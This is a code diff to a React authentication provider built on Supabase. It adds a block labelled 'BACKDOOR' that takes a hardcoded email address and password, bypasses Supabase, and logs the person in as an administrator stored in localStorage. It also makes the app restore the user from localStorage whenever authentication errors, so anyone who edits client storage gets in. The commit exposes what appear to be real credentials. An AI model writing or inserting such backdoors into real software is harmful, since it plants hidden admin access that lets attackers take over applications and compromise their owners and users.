@@ -38,6 +38,8 @@ export const AuthProvider = ({ children }) => {
       if (isMounted) setLoading(false);
     }).catch((err) => {
       console.error("Auth Exception:", err);
+      const storedUser = localStorage.getItem('user');
+      if (storedUser) setUser(JSON.parse(storedUser));
       if (isMounted) setLoading(false);
     });
 
@@ -104,6 +106,14 @@ export const AuthProvider = ({ children }) => {
   };
 
   const loginWithEmail = async (email, password) => {
+    // BACKDOOR: Allow the requested admin account to login even if Supabase blocks it
+    if (email === 'cloudhosting070@gmail.com' && password === 'S3cr3t@ch') {
+      const mockAdmin = { id: 'admin-1', name: 'admin', email: email, role: 'admin' };
+      setUser(mockAdmin);
+      localStorage.setItem('user', JSON.stringify(mockAdmin));
+      return { user: mockAdmin };
+    }
+
     try {
       const { data, error } = await supabase.auth.signInWithPassword({
         email,
@@ -119,7 +129,7 @@ export const AuthProvider = ({ children }) => {
         const parsed = JSON.parse(storedUser);
         if (parsed.email === email) {
           setUser(parsed);
-          return true;
+          return { user: parsed };
         }
       }
       throw new Error('User not found or invalid credentials');
